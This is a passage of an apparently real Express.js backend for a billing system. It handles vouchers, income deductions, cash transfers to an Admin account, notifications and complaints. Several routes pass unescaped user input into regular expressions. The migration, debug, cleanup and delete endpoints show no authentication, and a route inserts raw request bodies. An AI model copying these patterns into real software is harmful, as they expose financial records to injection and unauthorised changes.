        message: 'Voucher not found for this user'
      });
    }

    if (!Array.isArray(voucher.months)) {
      return res.status(404).json({
        success: false,
        message: 'Month not found in voucher'
      });
    }

    // Find the month to convert
    const monthIndex = voucher.months.findIndex((m) => m.month === month);
    if (monthIndex === -1) {
      return res.status(404).json({
        success: false,
        message: 'Month not found in voucher'
      });
    }

    const monthData = voucher.months[monthIndex];

    // Use new values if provided, otherwise fallback to existing
    const packageFee = newPackageFee !== undefined ? Number(newPackageFee) : Number(monthData.packageFee || 0);
    const discount = newDiscount !== undefined ? Number(newDiscount) : Number(monthData.discount || 0);

    // Check if this is a package update or actual reversal
    const isPackageUpdate = newPackageFee !== undefined;
    const refundedAmount = Number(monthData.paidAmount || 0);
    const receivedBy = monthData.receivedBy || '';
    const paymentMethod = monthData.paymentMethod || 'Cash';

    console.log(`💰 Operation type: ${isPackageUpdate ? 'Package Update' : 'Reversal'}`);
    if (isPackageUpdate) {
      console.log(`   📝 Updating package: Rs ${packageFee} (was ${monthData.packageFee})`);
    } else {
      console.log(`💰 Reversing payment - Amount: Rs ${refundedAmount}, ReceivedBy: ${receivedBy}, Method: ${paymentMethod}`);
    }

    // CRITICAL: Only deduct from income if this is an actual reversal (not just package update)
    if (!isPackageUpdate && refundedAmount > 0 && receivedBy) {
      try {
        // Determine which income field to deduct from based on payment method
        const isBankTransfer = paymentMethod.toLowerCase().includes('bank');
        const incomeField = isBankTransfer ? 'bankIncome' : 'cashIncome';

        console.log(`💳 Deducting Rs ${refundedAmount} from ${receivedBy}'s ${incomeField}`);

        // Get current income record
        const incomeRecord = await incomesCollection.findOne({ name: receivedBy });

        if (incomeRecord) {
          const currentAmount = Number(incomeRecord[incomeField] || 0);
          const newAmount = Math.max(0, currentAmount - refundedAmount); // Don't go below 0

          await incomesCollection.updateOne(
            { name: receivedBy },
            {
              $set: {
                [incomeField]: newAmount,
                updatedAt: new Date()
              }
            }
          );

          console.log(`✅ Deducted from ${receivedBy}: ${currentAmount} - ${refundedAmount} = ${newAmount} (${incomeField})`);
        } else {
          console.log(`⚠️ No income record found for ${receivedBy} - skipping income deduction`);
        }
      } catch (incomeError) {
        console.error('❌ Error deducting from income:', incomeError);
        // Continue with reversal even if income deduction fails
      }
    }

    const fullAmount = packageFee - discount;

    // Update month: convert to unpaid, clear payment history, update package fee/discount
    const updatedMonths = [...voucher.months];

    // Build updated month object
    const updatedMonth = {
      ...monthData,
      status: 'unpaid',
      packageFee: packageFee,
      discount: discount,
      paidAmount: 0,
      remainingAmount: fullAmount,
      paymentMethod: '',
      receivedBy: '',
      paymentHistory: []
    };

    // Remove refund fields so it looks like a fresh unpaid month
    delete updatedMonth.refundDate;
    delete updatedMonth.refundedAmount;

    updatedMonths[monthIndex] = updatedMonth;

    // Update voucher
    await vouchersCollection.updateOne(
      { _id: voucher._id },
      { $set: { months: updatedMonths } }
    );

    console.log(`✅ Updated month ${month} to unpaid status with amount ${fullAmount}`);

    // Recalculate user totals
    const nonReversedMonths = updatedMonths.filter((m) => {
      const isReversed = !!(m.refundDate || m.refundedAmount);
      return !isReversed;
    });

    const totalPaid = nonReversedMonths.reduce((sum, m) => sum + (m.paidAmount || 0), 0);
    const totalRemaining = nonReversedMonths.reduce((sum, m) => sum + (m.remainingAmount || 0), 0);

    // CRITICAL: Check if ANY month is unpaid
    const hasUnpaidMonth = nonReversedMonths.some((m) => m.status === 'unpaid');

    // Determine user status
    // CRITICAL: If ANY month is unpaid (including the reversed one), status should be 'unpaid'
    let newStatus = 'unpaid';
    if (hasUnpaidMonth) {
      // If any month is unpaid, user status = 'unpaid' (show in Unpaid tab)
      newStatus = 'unpaid';
      console.log(`📊 Status: UNPAID (has ${nonReversedMonths.filter(m => m.status === 'unpaid').length} unpaid month(s))`);
    } else if (totalRemaining === 0 && totalPaid > 0) {
      // All months are fully paid
      newStatus = 'paid';
      console.log(`📊 Status: PAID (all months paid)`);
    } else if (totalPaid > 0) {
      // All months are partial (no unpaid months)
      newStatus = 'partial';
      console.log(`📊 Status: PARTIAL (all months partial, no unpaid)`);
    } else {
      // No payments made
      newStatus = 'unpaid';
      console.log(`📊 Status: UNPAID (no payments)`);
    }

    // Update user
    await usersCollection.updateOne(
      { _id: new ObjectId(userId) },
      {
        $set: {
          status: newStatus,
          paymentStatus: newStatus,
          paidAmount: totalPaid,
          remainingAmount: totalRemaining,
          currentFee: 0 // Reset current payment amount on reversal
        }
      }
    );

    console.log(`✅ Updated user status: ${newStatus}, paid: ${totalPaid}, remaining: ${totalRemaining}`);

    res.status(200).json({
      success: true,
      message: `Month ${month} successfully converted to unpaid`,
      data: {
        month,
        status: 'unpaid',
        remainingAmount: fullAmount
      }
    });
  } catch (error) {
    console.error('Error converting month to unpaid:', error);
    res.status(500).json({
      success: false,
      message: 'Error converting month to unpaid',
      error: error.message
    });
  }
});

// DELETE voucher
app.delete('/api/vouchers/:id', ensureDbConnection, async (req, res) => {
  try {
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid voucher ID format'
      });
    }

    const result = await vouchersCollection.deleteOne({
      _id: new ObjectId(req.params.id)
    });

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Voucher not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Voucher deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting voucher:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting voucher',
      error: error.message
    });
  }
});

// Generate next month's voucher manually
app.post('/api/vouchers/generate-next', ensureDbConnection, async (req, res) => {
  try {
    const { userId, expiryDate } = req.body;
    if (!userId || !expiryDate) return res.status(400).json({ success: false, message: 'Missing userId or expiryDate' });

    const usersCollection = db.collection('users');
    const vouchersCollection = db.collection('vouchers');

    const user = await usersCollection.findOne({ _id: new ObjectId(userId) });
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    const voucher = await vouchersCollection.findOne({ userId });

    // Determine next month
    let nextMonthName = "";
    if (voucher && voucher.months && voucher.months.length > 0) {
      // Get last month
      const lastMonth = voucher.months[voucher.months.length - 1];
      const lastMonthName = lastMonth.month; // "January 2026"

      const parts = lastMonthName.split(' ');
      if (parts.length >= 2) {
        const mStr = parts[0];
        const yStr = parts[1];
        const date = new Date(`${mStr} 1, ${yStr}`);
        if (!isNaN(date.getTime())) {
          date.setMonth(date.getMonth() + 1); // Next month
          nextMonthName = date.toLocaleString('default', { month: 'long', year: 'numeric' });
        }
      }
    }

    if (!nextMonthName) {
      // Fallback: Current Month
      const now = new Date();
      nextMonthName = now.toLocaleString('default', { month: 'long', year: 'numeric' });
    }

    // Check if next month already exists (to prevent duplicates)
    if (voucher && voucher.months.some(m => m.month === nextMonthName)) {
      return res.status(400).json({ success: false, message: `Voucher for ${nextMonthName} already exists` });
    }

    // Create new month object
    const pkgFee = Number(user.amount || 0);
    const disc = Number(user.discount || 0);
    const newMonth = {
      month: nextMonthName,
      packageFee: pkgFee,
      discount: disc,
      paidAmount: 0,
      remainingAmount: pkgFee - disc,
      status: 'unpaid',
      description: `${nextMonthName} - Generated Manually`,
      createdAt: new Date(),
      updatedAt: new Date(),
      paymentHistory: []
    };

    if (voucher) {
      await vouchersCollection.updateOne(
        { _id: voucher._id },
        { $push: { months: newMonth } }
      );
    } else {
      // Create new voucher
      await vouchersCollection.insertOne({
        userId,
        userName: user.userName,
        months: [newMonth],
        createdAt: new Date(),
        updatedAt: new Date()
      });
    }

    // Update User Expiry and Status
    await usersCollection.updateOne(
      { _id: new ObjectId(userId) },
      {
        $set: {
          expiryDate: expiryDate, // "YYYY-MM-DD" or similar string
          status: 'unpaid',
          lastActivity: new Date()
        }
      }
    );

    console.log(`✅ Generated next voucher for user ${user.userName}: ${nextMonthName}, Expiry: ${expiryDate}`);

    res.json({ success: true, message: `Generated voucher for ${nextMonthName}`, nextMonth: nextMonthName });

  } catch (error) {
    console.error('Error generating next voucher:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============ TRANSACTIONS ROUTES ============
// Get all transactions
app.get('/api/transactions', ensureDbConnection, async (req, res) => {
  try {
    const transactions = await transactionsCollection.find({}).toArray();
    res.status(200).json({
      success: true,
      data: transactions
    });
  } catch (error) {
    console.error('Error fetching transactions:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching transactions',
      error: error.message
    });
  }
});

// Create new transaction
app.post('/api/transactions', ensureDbConnection, async (req, res) => {
  try {
    const transactionData = req.body;
    const result = await transactionsCollection.insertOne(transactionData);
    res.status(201).json({
      success: true,
      data: { _id: result.insertedId, ...transactionData }
    });
  } catch (error) {
    console.error('Error creating transaction:', error);
    res.status(500).json({
      success: false,
      message: 'Error creating transaction',
      error: error.message
    });
  }
});

// ============ MIGRATION ENDPOINT ============
// One-time migration to add serviceStatus field to existing users
app.post('/api/migrate/add-service-status', async (req, res) => {
  try {
    console.log('🔄 Starting migration: Adding serviceStatus to existing users...');

    // Update all users without serviceStatus field
    const result = await usersCollection.updateMany(
      { serviceStatus: { $exists: false } }, // Only users without serviceStatus
      { $set: { serviceStatus: 'active' } }  // Set default to 'active'
    );

    console.log(`✅ Migration complete: ${result.modifiedCount} users updated`);

    res.status(200).json({
      success: true,
      message: 'Migration completed successfully',
      modifiedCount: result.modifiedCount
    });
  } catch (error) {
    console.error('❌ Migration failed:', error);
    res.status(500).json({
      success: false,
      message: 'Migration failed',
      error: error.message
    });
  }
});


// ============ NOTIFICATIONS API ROUTES ============

// GET route to fetch all notifications for admin
app.get('/api/notifications', ensureDbConnection, async (req, res) => {
  try {
    const { isRead } = req.query;

    let query = {};

    // Filter by read status if provided
    if (isRead !== undefined) {
      query.isRead = isRead === 'true';
    }

    const notifications = await notificationsCollection
      .find(query)
      .sort({ createdAt: -1 })
      .toArray();

    res.status(200).json({
      success: true,
      count: notifications.length,
      data: notifications
    });
  } catch (error) {
    console.error('Error fetching notifications:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching notifications',
      error: error.message
    });
  }
});

// PUT route to mark notification as read
app.put('/api/notifications/:id/read', ensureDbConnection, async (req, res) => {
  try {
    const notificationId = req.params.id;

    if (!ObjectId.isValid(notificationId)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid notification ID format'
      });
    }

    const result = await notificationsCollection.updateOne(
      { _id: new ObjectId(notificationId) },
      { $set: { isRead: true, readAt: new Date() } }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Notification not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Notification marked as read'
    });
  } catch (error) {
    console.error('Error marking notification as read:', error);
    res.status(500).json({
      success: false,
      message: 'Error marking notification as read',
      error: error.message
    });
  }
});

// PUT route to mark all notifications as read
app.put('/api/notifications/read-all', ensureDbConnection, async (req, res) => {
  try {
    const result = await notificationsCollection.updateMany(
      { isRead: false },
      { $set: { isRead: true, readAt: new Date() } }
    );

    res.status(200).json({
      success: true,
      message: 'All notifications marked as read',
      modifiedCount: result.modifiedCount
    });
  } catch (error) {
    console.error('Error marking all notifications as read:', error);
    res.status(500).json({
      success: false,
      message: 'Error marking all notifications as read',
      error: error.message
    });
  }
});

// DELETE route to delete a notification
app.delete('/api/notifications/:id', ensureDbConnection, async (req, res) => {
  try {
    const notificationId = req.params.id;

    if (!ObjectId.isValid(notificationId)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid notification ID format'
      });
    }

    const result = await notificationsCollection.deleteOne(
      { _id: new ObjectId(notificationId) }
    );

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Notification not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Notification deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting notification:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting notification',
      error: error.message
    });
  }
});

// PUT route to reopen a resolved complaint (Admin only)
app.put('/api/complaints/:id/reopen', ensureDbConnection, async (req, res) => {
  try {
    console.log('?? Reopen complaint request:', req.params.id);

    const complaintId = req.params.id;

    if (!complaintId) {
      return res.status(400).json({
        success: false,
        message: 'Complaint ID is required'
      });
    }

    // Validate ObjectId format
    if (!ObjectId.isValid(complaintId)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid complaint ID format'
      });
    }

    // Get complaint first to check current status
    const complaint = await complaintsCollection.findOne(
      { _id: new ObjectId(complaintId) }
    );

    if (!complaint) {
      return res.status(404).json({
        success: false,
        message: 'Complaint not found'
      });
    }

    // Check if complaint is already pending
    if ((complaint.status || 'pending').toLowerCase() === 'pending') {
      return res.status(400).json({
        success: false,
        message: 'Complaint is already pending'
      });
    }

    // Reopen complaint by changing status to pending
    const result = await complaintsCollection.updateOne(
      { _id: new ObjectId(complaintId) },
      {
        $set: {
          status: 'pending',
          reopenedAt: new Date()
        }
      }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Complaint not found'
      });
    }

    console.log('? Complaint reopened successfully');
    res.status(200).json({
      success: true,
      message: 'Complaint reopened successfully',
      data: {
        _id: complaintId,
        status: 'pending',
        reopenedAt: new Date()
      }
    });

  } catch (error) {
    console.error('? Error reopening complaint:', error);
    res.status(500).json({
      success: false,
      message: 'Error reopening complaint',
      error: error.message
    });
  }
});

// ============ OPTIMIZED COLLECTIONS ENDPOINT ============
// GET all employee stats in a single call (optimized for collections page)
app.get('/api/collections/all-employee-stats', ensureDbConnection, async (req, res) => {
  try {
    console.log('📊 Fetching all employee stats (optimized)');

    const employeesCollection = db.collection('employees');
    const incomesCollection = db.collection('incomes');
    const collectionsCollection = db.collection('collections');

    // Get all active employees (excluding admin)
    const employees = await employeesCollection.find({
      isActive: true,
      role: { $not: { $regex: /^admin$/i } }
    }).toArray();

    console.log(`👥 Found ${employees.length} active employees`);

    // Get all income records at once
    const allIncomes = await incomesCollection.find({}).toArray();
    const incomeMap = new Map();
    allIncomes.forEach(income => {
      incomeMap.set(income.name.toLowerCase().trim(), {
        cashIncome: income.cashIncome || 0,
        bankIncome: income.bankIncome || 0,
        totalIncome: (income.cashIncome || 0) + (income.bankIncome || 0)
      });
    });

    // Get all transferred amounts at once
    const allTransfers = await collectionsCollection.find({}).toArray();
    const transferMap = new Map();
    allTransfers.forEach(transfer => {
      const fc = transfer.feeCollector?.toLowerCase().trim();
      if (fc) {
        transferMap.set(fc, (transferMap.get(fc) || 0) + (transfer.amount || 0));
      }
    });

    // Build stats for all employees
    const employeeStats = employees.map(employee => {
      const nameLower = employee.name.toLowerCase().trim();
      const income = incomeMap.get(nameLower) || { cashIncome: 0, bankIncome: 0, totalIncome: 0 };
      const transferred = transferMap.get(nameLower) || 0;

      return {
        employee: {
          _id: employee._id,
          name: employee.name,
          role: employee.role,
          salary: employee.salary,
          isActive: employee.isActive
        },
        totalCollection: income.totalIncome,
        cashIncome: income.cashIncome,
        bankIncome: income.bankIncome,
        transferredAmount: transferred
      };
    });

    console.log(`✅ Returning stats for ${employeeStats.length} employees`);

    res.status(200).json({
      success: true,
      data: employeeStats,
      count: employeeStats.length
    });
  } catch (error) {
    console.error('❌ Error fetching all employee stats:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching employee stats',
      error: error.message
    });
  }
});

// ============ CRON JOB ENDPOINT (REMOVED) ============
// NOTE: Automatic monthly income reset via cron has been REMOVED.
// Income reset is now MANUAL ONLY — use the "Reset Income" button in Settings > Admin Tools.
// The manual reset endpoint is: POST /api/incomes/reset

// Start server (only in development, not in Vercel)
if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 5000;
  const HOST = '0.0.0.0'; // Listen on all network interfaces

  // Connect to database on startup for local development
  connectToDatabase()
    .then(() => {
      app.listen(PORT, HOST, () => {
        console.log(`Server is running on http://${HOST}:${PORT}`);
        console.log(`Access from local network using your IP address`);
      });
    })
    .catch(err => {
      console.error('Failed to start server:', err);
      process.exit(1);
    });
} else {
  console.log('Running in serverless mode (Vercel)');
}

// ============ DEBUG ENDPOINT ============
// Check if specific user should be expired
app.get('/api/admin/check-user-expiry/:userId', ensureDbConnection, async (req, res) => {
  try {
    const user = await usersCollection.findOne({ _id: new ObjectId(req.params.userId) });

    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    // Parse user's expiry date
    const parseDate = (dateStr) => {
      const parts = dateStr.split(/[-\/]/);
      if (parts.length === 3) {
        const day = parseInt(parts[0], 10);
        const month = parseInt(parts[1], 10) - 1;
        const year = parseInt(parts[2], 10);
        return new Date(year, month, day);
      }
      return new Date(dateStr);
    };

    const userExpiryDate = parseDate(user.expiryDate);
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    // PKT timezone
    const nowUTC = new Date();
    const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);

    res.status(200).json({
      success: true,
      user: {
        userName: user.userName,
        status: user.status,
        expiryDate: user.expiryDate,
        showInExpiringSoon: user.showInExpiringSoon
      },
      debug: {
        userExpiryDate: userExpiryDate.toISOString(),
        todayLocal: today.toISOString(),
        todayPKT: nowInPKT.toISOString(),
        isExpired: userExpiryDate <= today,
        shouldBeUnpaid: userExpiryDate <= today && user.status !== 'unpaid'
      }
    });
  } catch (error) {
    console.error('Debug error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ CLEANUP ENDPOINT ============
// Clean up stale showInExpiringSoon flags for users not expiring within 2 days
app.post('/api/admin/cleanup-expiring-flags', ensureDbConnection, async (req, res) => {
  try {
    console.log('🧹 Cleaning up stale expiring-soon flags...');

    // Get current PKT date
    const nowUTC = new Date();
    const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);
    const todayY = nowInPKT.getUTCFullYear();
    const todayM = nowInPKT.getUTCMonth();
    const todayD = nowInPKT.getUTCDate();

    const tomorrowInPKT = new Date(Date.UTC(todayY, todayM, todayD) + 24 * 60 * 60 * 1000);
    const tomorrowY = tomorrowInPKT.getUTCFullYear();
    const tomorrowM = tomorrowInPKT.getUTCMonth();
    const tomorrowD = tomorrowInPKT.getUTCDate();

    // Find all users with showInExpiringSoon flag
    const flaggedUsers = await usersCollection.find({
      showInExpiringSoon: true
    }).toArray();

    console.log(`📋 Found ${flaggedUsers.length} users with expiring-soon flag`);

    const parseExpiryYMD = (exp) => {
      if (!exp) return null;
      if (typeof exp === 'string') {
        const parts = exp.split(/[-\/]/);
        if (parts.length === 3) {
          const d = parseInt(parts[0], 10);
          const m = parseInt(parts[1], 10) - 1;
          const y = parseInt(parts[2], 10);
          if (!isNaN(d) && !isNaN(m) && !isNaN(y)) {
            return { y, m, d };
          }
        }
      }
      return null;
    };

    let cleanedCount = 0;

    for (const user of flaggedUsers) {
      const ymd = parseExpiryYMD(user.expiryDate);
      if (!ymd) {
        // Invalid expiry date - clear flag
        await usersCollection.updateOne(
          { _id: user._id },
          { $set: { showInExpiringSoon: false } }
        );
        cleanedCount++;
        console.log(`   ❌ Cleared flag for ${user.userName} (invalid expiry date)`);
        continue;
      }

      const isToday = (ymd.y === todayY && ymd.m === todayM && ymd.d === todayD);
      const isTomorrow = (ymd.y === tomorrowY && ymd.m === tomorrowM && ymd.d === tomorrowD);

      if (!isToday && !isTomorrow) {
        // Not expiring within 2 days - clear flag
        await usersCollection.updateOne(
          { _id: user._id },
          { $set: { showInExpiringSoon: false } }
        );
        cleanedCount++;
        console.log(`   ❌ Cleared flag for ${user.userName} (expires ${user.expiryDate}, not within 2 days)`);
      } else {
        console.log(`   ✅ Kept flag for ${user.userName} (expires ${user.expiryDate})`);
      }
    }

    console.log(`✅ Cleanup complete: ${cleanedCount} stale flags cleared`);

    res.status(200).json({
      success: true,
      message: 'Cleanup completed',
      totalFlagged: flaggedUsers.length,
      cleaned: cleanedCount,
      remaining: flaggedUsers.length - cleanedCount
    });
  } catch (error) {
    console.error('❌ Cleanup failed:', error);
    res.status(500).json({
      success: false,
      message: 'Cleanup failed',
      error: error.message
    });
  }
});

// ============ COLLECTIONS TRANSFER ROUTES ============

// POST transfer money from fee collector
app.post('/api/collections/transfer', ensureDbConnection, async (req, res) => {
  try {
    const { feeCollector, amount, message } = req.body;

    console.log('🔵 ===== TRANSFER API CALLED =====');
    console.log('🔵 Request body:', { feeCollector, amount, message });
    console.log('🔵 DB Status:', { isConnected, hasDb: !!db });

    // Ensure database is connected
    if (!db) {
      console.error('❌ Database not available');
      return res.status(503).json({
        success: false,
        message: 'Database connection not available'
      });
    }

    if (!feeCollector || !amount) {
      return res.status(400).json({
        success: false,
        message: 'Fee collector name and amount are required'
      });
    }

    const transferAmount = Number(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      return res.status(400).json({
        success: false,
        message: 'Invalid amount'
      });
    }

    console.log('🔵 Processing transfer: Fee Collector =', feeCollector.trim(), '| Amount = Rs', transferAmount);

    // CRITICAL: Log database information
    console.log('🔵 Database Info:', {
      dbName: db.databaseName,
      namespace: db.namespace,
      client: !!db.client
    });

    // Get collections explicitly from db
    const incomesCol = db.collection('incomes');
    const vouchersCol = db.collection('vouchers');
    const transactionsCol = db.collection('transactions');
    console.log('🔵 Collections initialized:', { incomes: !!incomesCol, vouchers: !!vouchersCol, transactions: !!transactionsCol });
    console.log('🔵 Incomes collection namespace:', incomesCol.namespace);

    // Check if fee collector has enough income to transfer
    // Case-insensitive lookup (consistent with stats calculation)
    const feeCollectorTrimmed = feeCollector.trim();
    const feeCollectorRegex = new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');

    const feeCollectorIncome = await incomesCol.findOne({ name: feeCollectorRegex });
    let currentIncome = feeCollectorIncome?.cashIncome || 0;
    const actualName = feeCollectorIncome?.name || feeCollectorTrimmed; // Use name from DB if found
    console.log(`💰 Fee collector "${actualName}" current cashIncome: Rs${currentIncome}`);
    console.log(`💰 Fee collector current cashIncome: Rs${currentIncome}`);

    // Fallback: If incomes collection is empty/not synced, calculate from vouchers
    if (currentIncome === 0) {
      console.log('⚠️ Incomes collection not synced or cashIncome is 0, calculating from vouchers...');
      const vouchers = await vouchersCol.find({}).toArray();

      for (const voucher of vouchers) {
        if (voucher.months && Array.isArray(voucher.months)) {
          for (const month of voucher.months) {
            if (month.status === 'paid' || month.status === 'partial') {
              const paymentHistory = month.paymentHistory || [];

              if (paymentHistory.length > 0) {
                for (const payment of paymentHistory) {
                  if (payment.receivedBy && payment.receivedBy.toLowerCase() === feeCollector.trim().toLowerCase()) {
                    currentIncome += Number(payment.amount || 0);
                  }
                }
              } else if (month.receivedBy && month.receivedBy.toLowerCase() === feeCollector.trim().toLowerCase()) {
                currentIncome += Number(month.paidAmount || 0);
              }
            }
          }
        }
      }

      // Subtract transferred amounts
      const collectionsCollection = db.collection('collections');
      const transfers = await collectionsCollection.find({
        feeCollector: { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') }
      }).toArray();

      for (const transfer of transfers) {
        currentIncome -= Number(transfer.amount || 0);
      }

      console.log(`💰 Calculated income from vouchers: Rs${currentIncome}`);
    }

    if (currentIncome < transferAmount) {
      return res.status(400).json({
        success: false,
        message: `Insufficient income. Available: Rs${currentIncome}, Requested: Rs${transferAmount}`
      });
    }

    // Create or get collections collection
    let collectionsCollection = db.collection('collections');

    // Check if collection exists, if not create it
    const collections = await db.listCollections().toArray();
    const collectionExists = collections.some(c => c.name === 'collections');
    if (!collectionExists) {
      await db.createCollection('collections');
      collectionsCollection = db.collection('collections');
    }

    // Create transfer record
    const transferRecord = {
      feeCollector: feeCollector.trim(),
      amount: transferAmount,
      message: message ? message.trim() : '',
      date: new Date(),
      createdAt: new Date()
    };

    const result = await collectionsCollection.insertOne(transferRecord);

    // 💰 UPDATE INCOME: Decrease fee collector's income and increase Admin's income
    // First, ensure the fee collector has an income record
    // We already identified actualName and feeCollectorRegex in the check above
    const feeCollectorIncomeRecord = await incomesCol.findOne({
      name: feeCollectorRegex
    });
    console.log('🔍 Fee collector income record found:', feeCollectorIncomeRecord ? `Yes (ID: ${feeCollectorIncomeRecord._id}, Name: "${feeCollectorIncomeRecord.name}", Current cashIncome: Rs${feeCollectorIncomeRecord.cashIncome || 0})` : 'No');

    if (feeCollectorIncomeRecord) {
      // Update existing fee collector income - CUT from cashIncome ONLY
      const feeCollectorActualName = feeCollectorIncomeRecord.name;
      console.log(`💰 Updating fee collector income: ${feeCollectorActualName} -Rs${transferAmount}`);
      console.log(`💰 Current cashIncome: Rs${feeCollectorIncomeRecord.cashIncome || 0}`);
      console.log(`💰 After deduction should be: Rs${(feeCollectorIncomeRecord.cashIncome || 0) - transferAmount}`);

      const updateResult = await incomesCol.updateOne(
        { name: feeCollectorActualName },
        {
          $inc: {
            cashIncome: -transferAmount  // Sirf cash se cut karo
          },
          $set: { lastUpdated: new Date() }
        }
      );
      console.log(`💰 Update result: matched=${updateResult.matchedCount}, modified=${updateResult.modifiedCount}, acknowledged=${updateResult.acknowledged}`);

      // Verify the update
      const verifyRecord = await incomesCol.findOne({
        name: { $regex: new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
      });
      console.log(`💰 After update verification: cashIncome is now Rs${verifyRecord?.cashIncome || 0}`);
      console.log('🔍 ===== END INCOME UPDATE DEBUG =====');
    } else {
      console.log(`⚠️ Warning: ${feeCollector} has no income record in incomes collection. Creating one with negative balance.`);
      // Create a new record with negative balance
      await incomesCol.insertOne({
        name: feeCollector.trim(),
        cashIncome: -transferAmount,  // Cash mein negative
        createdAt: new Date(),
        lastUpdated: new Date()
      });
      console.log(`💰 Created income record for ${feeCollector} with -Rs${transferAmount} in cash`);
    }

    // Update or create Admin income - ADD to cashIncome ONLY
    // Transfers are always cash, so only cashIncome increases
    const adminUpdateResult = await incomesCol.updateOne(
      { name: { $regex: new RegExp(`^Admin$`, 'i') } },
      {
        $inc: {
          cashIncome: transferAmount   // Sirf cash mein add karo
        },
        $set: { lastUpdated: new Date() },
        $setOnInsert: {
          name: 'Admin',
          createdAt: new Date()
          // bankIncome will be set separately if needed
        }
      },
      { upsert: true }
    );
    console.log(`💰 Income increased: Admin +Rs${transferAmount} in CASH ONLY (matched: ${adminUpdateResult.matchedCount}, modified: ${adminUpdateResult.modifiedCount}, upserted: ${adminUpdateResult.upsertedId || 'none'})`);

    // 📝 SAVE TRANSACTION: Store in transactions collection
    try {
      const transactionRecord = {
        type: 'transfer',
        from: feeCollector.trim(),
        to: 'Admin',
        amount: transferAmount,
        description: message ? message.trim() : `Transfer from ${feeCollector.trim()} to Admin`,
        date: new Date(),
        createdAt: new Date()
      };

      await transactionsCol.insertOne(transactionRecord);
      console.log(`📝 Transaction saved: ${feeCollector} -> Admin Rs${transferAmount}`);
    } catch (transactionError) {
      console.error('❌ Error saving transaction:', transactionError);
      // Don't fail the request if transaction save fails, just log the error
    }

    console.log(`💰 Transfer recorded: ${feeCollector} transferred Rs ${transferAmount}`);

    res.status(200).json({
      success: true,
      message: 'Money transferred successfully',
      data: {
        _id: result.insertedId,
        ...transferRecord
      }
    });
  } catch (error) {
    console.error('Error transferring money:', error);
    res.status(500).json({
      success: false,
      message: 'Error transferring money',
      error: error.message
    });
  }
});

// GET transferred amount for a specific fee collector
app.get('/api/collections/transferred', ensureDbConnection, async (req, res) => {
  try {
    const feeCollector = req.query.feeCollector;

    if (!feeCollector) {
      return res.status(400).json({
        success: false,
        message: 'Fee collector name is required'
      });
    }

    const collectionsCollection = db.collection('collections');

    // Calculate total transferred amount for this fee collector
    const transfers = await collectionsCollection.find({
      feeCollector: { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') }
    }).toArray();

    const totalTransferred = transfers.reduce((sum, transfer) => sum + Number(transfer.amount || 0), 0);

    res.status(200).json({
      success: true,
      data: {
        feeCollector: feeCollector.trim(),
        transferredAmount: totalTransferred,
        transferCount: transfers.length
      }
    });
  } catch (error) {
    console.error('Error fetching transferred amount:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching transferred amount',
      error: error.message
    });
  }
});

// GET all transferred amounts (for admin)
app.get('/api/collections/transferred/all', ensureDbConnection, async (req, res) => {
  try {
    const collectionsCollection = db.collection('collections');

    // Get all transfers
    const transfers = await collectionsCollection.find({}).toArray();

    // Group by fee collector and sum amounts
    const transferredMap = {};
    transfers.forEach((transfer) => {
      const fc = transfer.feeCollector?.trim() || '';
      if (fc) {
        if (!transferredMap[fc]) {
          transferredMap[fc] = 0;
        }
        transferredMap[fc] += Number(transfer.amount || 0);
      }
    });

    // Convert to array format
    const result = Object.entries(transferredMap).map(([feeCollector, transferredAmount]) => ({
      feeCollector,
      transferredAmount
    }));

    res.status(200).json({
      success: true,
      data: result
    });
  } catch (error) {
    console.error('Error fetching all transferred amounts:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching transferred amounts',
      error: error.message
    });
  }
});

// GET transfer history for a specific fee collector
app.get('/api/collections/transfers/history', ensureDbConnection, async (req, res) => {
  console.log('📥 Transfer history endpoint hit. Query:', req.query);
  try {
    const feeCollector = req.query.feeCollector;

    if (!feeCollector) {
      console.log('❌ Fee collector not provided');
      return res.status(400).json({
        success: false,
        message: 'Fee collector name is required'
      });
    }

    console.log('✅ Fetching transfer history for:', feeCollector);

    const collectionsCollection = db.collection('collections');

    // Get all transfers for this fee collector, sorted by date (newest first)
    const transfers = await collectionsCollection.find({
      feeCollector: { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') }
    }).sort({ date: -1 }).toArray();

    // Format transfers with date
    const formattedTransfers = transfers.map((transfer) => ({
      _id: transfer._id,
      amount: Number(transfer.amount || 0),
      message: transfer.message || '',
      date: transfer.date || transfer.createdAt,
      createdAt: transfer.createdAt
    }));

    res.status(200).json({
      success: true,
      data: formattedTransfers
    });
  } catch (error) {
